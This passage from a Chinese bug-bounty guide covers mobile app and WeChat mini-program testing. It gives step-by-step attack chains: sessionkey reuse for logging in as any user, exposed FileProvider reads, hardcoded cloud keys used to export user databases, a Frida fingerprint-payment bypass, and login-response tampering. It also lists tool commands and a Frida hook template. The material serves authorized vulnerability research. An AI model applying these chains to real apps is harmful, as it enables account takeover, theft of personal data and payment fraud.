leaf="">iOS（需越狱）</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">lldb</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">iOS调试</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">iOS（需越狱）</span></section></td></tr></tbody></table>## 第六章 实战案例库（完整攻击链）  
### 【案例1】小程序sessionkey泄露→任意用户登录→订单信息泄露  
  
**目标**  
：某酒店预订小程序**耗时**  
：1小时**奖金**  
：5,000元  
  
**攻击路径**  
：  
1. **信息收集**  
：反编译wxapkg，发现API域名和云环境ID  
  
1. **抓包分析**  
：手机号一键登录接口返回包中包含sessionkey  
  
1. **sessionkey复用**  
：构造请求头X-Wx-Sessionkey: 获取的值  
，调用用户信息接口  
  
1. **任意登录**  
：编写脚本，遍历手机号列表，用sessionkey获取对应用户信息  
  
1. **数据获取**  
：拿到5000+用户的姓名、手机号、历史订单  
  
1. **报告提交**  
：完整攻击链，高危评级  
  
### 【案例2】APP组件暴露→文件读取→数据库密码泄露  
  
**目标**  
：某政务APP**耗时**  
：2小时**奖金**  
：4,000元  
  
**攻击路径**  
：  
1. **静态分析**  
：反编译APK，发现FileProvider  
导出，路径为/data/data/包名/files/  
  
1. **动态验证**  
：编写PoC，通过Intent调用FileProvider读取/data/data/包名/databases/app.db  
  
1. **数据分析**  
：数据库中发现config  
表，存储服务器IP、数据库用户名密码  
  
1. **横向移动**  
：用获取的密码连接后台数据库，获取更多数据  
  
1. **报告提交**  
：组件暴露+敏感信息泄露组合  
  
### 【案例3】小程序云开发密钥→数据库接管  
  
**目标**  
：某电商小程序**耗时**  
：30分钟**奖金**  
：6,000元  
  
**攻击路径**  
：  
1. **反编译**  
：解包wxapkg，在app.js  
中发现云环境ID和secret  
  
1. **环境连接**  
：使用小程序开发者工具，配置云环境ID和密钥  
  
1. **数据库操作**  
：查看云数据库中的所有集合，包括users  
、orders  
、products  
  
1. **数据导出**  
：导出所有用户信息（含手机号、收货地址）  
  
1. **报告提交**  
：密钥硬编码高危漏洞  
  
### 【案例4】APP生物识别绕过→资金盗用  
  
**目标**  
：某支付APP**耗时**  
：3小时**奖金**  
：8,000元  
  
**攻击路径**  
：  
1. **环境准备**  
：安装APP到测试机，发现使用指纹支付功能  
  
1. **漏洞发现**  
：抓包分析指纹验证流程，发现认证成功后直接发送{auth: true}  
  
1. **Hook分析**  
：用Frida Hook指纹验证相关类，发现未验证CryptoObject  
  
1. **绕过验证**  
：编写Frida脚本，直接调用onAuthenticationSucceeded  
  
1. **支付测试**  
：绕过指纹验证，成功发起任意金额支付（测试环境）  
  
1. **报告提交**  
：认证绕过高危漏洞  
  
### 【案例5】小程序返回包篡改→任意用户登录  
  
**目标**  
：某旅游类小程序**耗时**  
：40分钟**奖金**  
：4,500元  
  
**攻击路径**  
（来自CN-SEC投稿）：  
1. **抓包分析**  
：手机号一键登录接口，返回包中包含明文手机号  
  
```
json
{"phoneNumber":"182****1234", "purePhoneNumber":"18212341234"}
```  
1. **篡改尝试**  
：拦截返回包，将手机号修改为目标用户的手机号  
  
1. **登录成功**  
：放包后直接登录为目标用户  
  
1. **数据查看**  
：可查看他人订单、个人信息  
  
1. **报告提交**  
：逻辑漏洞高危  
  
## 第七章 自动化武器库  
### 7.1 小程序反编译与信息提取工具  
  
**wechat_appinfo_wxapkg**  
 工具集：  
```
python
# 批量搜索小程序
python wechat_app_search.py -k "酒店"
# 提取wxapkg中的敏感信息
python wechat_wxapkg_infoget.py -f target.wxapkg
# 批量搜索域名
python wechat_domains_search.py -i appid_list.txt
```  
### 7.2 APP自动化分析工具  
```
bash
# MobSF - 移动安全框架
docker run -p 8000:8000 opensecurity/mobile-security-framework-mobsf
# APKLeaks - 提取APK中的URL/端点
python apkleaks.py -f target.apk
# QARK - Android漏洞扫描
qark --apk target.apk
```  
### 7.3 Frida脚本模板  
  
**Hook函数打印参数和返回值**  
：  
```
javascript
Java.perform(function() {
    var targetClass = Java.use('com.example.TargetClass');
    targetClass.sensitiveFunction.implementation = function(arg1, arg2) {
        console.log('[+] sensitiveFunction called with args: ' + arg1 + ', ' + arg2);
        var result = this.sensitiveFunction(arg1, arg2);
        console.log('[+] Result: ' + result);
        return result;
    };
});
```  
### 7.4 移动端信息收集检查清单  
```
# 小程序检查清单
- [ ] 反编译wxapkg提取敏感信息
- [ ] 登录接口sessionkey泄露
- [ ] 云开发密钥硬编码
- [ ] 小程序码scene参数注入
- [ ] web-view XSS
- [ ] 支付参数篡改

# APP检查清单
- [ ] 组件暴露（exported组件）
- [ ] 本地存储敏感信息
- [ ] 证书锁定绕过
- [ ] Root/越狱检测绕过
- [ ] 生物识别逻辑绕过
- [ ] 动态代码加载漏洞
```  
## 第八章 移动端SRC的“奖金密码”  
### 8.1 为什么同样的漏洞，有人拿得多？  
<table><thead><tr><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px 10px 0px;text-align: left;"><section><span leaf="">漏洞类型</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">基础提交</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">深度利用</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">差距原因</span></section></th></tr></thead><tbody><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">sessionkey泄露</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">提交即走（500-1000）</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">组合任意用户登录+遍历数据（3000-5000）</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">利用深度</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">密钥硬编码</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">只报密钥（500）</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">用密钥连接数据库/云服务（3000-8000）</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">验证利用</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">组件暴露</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">报风险（300）</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">证明可读取敏感文件（2000+）</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">可验证的PoC</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><section><span leaf="">生物识别绕过</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">报原理（1000）</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">演示资金盗用（5000+）</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">影响评估</span></section></td></tr></tbody></table>  
**核心公式**  
：奖金 = 漏洞本身价值 × 利用深度 × 业务影响系数  
### 8.2 移动端报告写作技巧  
1. **必须包含可复现的PoC**  
：截图、请求包、脚本  
  
1. **证明业务影响**  
：不只是“能越权”，要“可查看他人订单+姓名+电话”  
  
1. **组合漏洞加分**  
：多个低危组合可升级为高危  
  
1. **提供修复建议**  
：具体到代码级别，展现专业性  
  
## 第九章 结语：移动端的红利窗口正在收窄  
  
2026年，移动应用渗透测试正从“手工时代”迈向“自动化+AI辅助时代”。但正因为自动化工具对移动端特有漏洞（如sessionkey泄露、生物识别绕过）识别率不足，**人工挖掘的红利窗口仍在**  
。  
  
我见过太多人花大量时间测Web端的SQL注入，却不知道目标小程序里就躺着云数据库的密钥。  
  
**下次面对SRC目标，别急着开Web扫描器。**  
  
先问自己三个问题：  
1. **这个小程序/APP有没有反编译价值？**  
  
1. **登录接口有没有返回敏感信息？**  
  
1. **客户端逻辑能不能被Hook篡改？**  
  
答案，往往决定你是拿500还是拿5000。  
  
**而你的奖金，也在这三个问题的延长线上。**  
  
  
